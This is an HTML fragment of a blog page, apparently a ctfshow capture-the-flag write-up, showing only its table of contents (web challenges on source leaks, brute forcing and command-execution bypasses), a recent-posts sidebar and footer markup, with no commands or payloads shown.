class="toc-number">1.1.</span> <span class="toc-text">web5 php源码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web6"><span class="toc-number">1.2.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">1.3.</span> <span class="toc-text">*web7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-number">1.4.</span> <span class="toc-text">*web8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web9"><span class="toc-number">1.5.</span> <span class="toc-text">*web9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web10"><span class="toc-number">1.6.</span> <span class="toc-text">web10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web11-%E5%9F%9F%E5%90%8D%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.7.</span> <span class="toc-text">*web11 域名隐藏信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web12"><span class="toc-number">1.8.</span> <span class="toc-text">web12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web13"><span class="toc-number">1.9.</span> <span class="toc-text">web13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web14"><span class="toc-number">1.10.</span> <span class="toc-text">web14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15"><span class="toc-number">1.11.</span> <span class="toc-text">web15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web16"><span class="toc-number">1.12.</span> <span class="toc-text">web16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web17"><span class="toc-number">1.13.</span> <span class="toc-text">web17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web18"><span class="toc-number">1.14.</span> <span class="toc-text">web18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web19"><span class="toc-number">1.15.</span> <span class="toc-text">web19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web20-%E6%97%A9%E6%9C%9Fasp-access%E6%9E%84%E6%9E%B6%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6mdb"><span class="toc-number">1.16.</span> <span class="toc-text">web20 早期asp+access构架的数据库文件mdb</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web21"><span class="toc-number">2.1.</span> <span class="toc-text">web21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web22-%E6%9A%82%E6%97%B6"><span class="toc-number">2.2.</span> <span class="toc-text">**web22 暂时</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web23"><span class="toc-number">2.3.</span> <span class="toc-text">web23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web24-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">web24 伪随机数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web25-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%80%92%E6%8E%A8"><span class="toc-number">2.5.</span> <span class="toc-text">*web25 伪随机数倒推</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web26"><span class="toc-number">2.6.</span> <span class="toc-text">web26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web27-%E8%BA%AB%E4%BB%BD%E8%AF%81%E6%97%A5%E6%9C%9F%E7%88%86%E7%A0%B4"><span class="toc-number">2.7.</span> <span class="toc-text">web27 身份证日期爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web28-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">2.8.</span> <span class="toc-text">web28 目录爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">绕过空格用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87cat"><span class="toc-number">3.2.</span> <span class="toc-text">绕过cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">3.3.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">3.4.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">3.5.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.6.</span> <span class="toc-text">*web32 伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">3.7.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">3.8.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">3.9.</span> <span class="toc-text">*web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">3.10.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">3.11.</span> <span class="toc-text">*web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">3.12.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">3.13.</span> <span class="toc-text">*web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40-%E6%97%A0%E5%8F%82%E6%95%B0"><span class="toc-number">3.14.</span> <span class="toc-text">*web40 无参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">3.15.</span> <span class="toc-text">web41</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/05/ctfshow%E9%9D%B6%E5%9C%BA/" title="ctfshow靶场">ctfshow靶场</a><time datetime="2025-02-05T02:30:23.000Z" title="Created 2025-02-05 10:30:23">2025-02-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/16/CTFTools/" title="CTFTools">CTFTools</a><time datetime="2024-10-16T11:43:16.000Z" title="Created 2024-10-16 19:43:16">2024-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/13/csrf/" title="csrf">csrf</a><time datetime="2024-10-13T05:26:57.000Z" title="Created 2024-10-13 13:26:57">2024-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/%E6%94%AF%E4%BB%98%E3%80%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="支付、越权漏洞">支付、越权漏洞</a><time datetime="2024-09-29T15:02:16.000Z" title="Created 2024-09-29 23:02:16">2024-09-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="任意文件包含漏洞">任意文件包含漏洞</a><time datetime="2024-09-29T15:02:00.000Z" title="Created 2024-09-29 23:02:00">2024-09-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
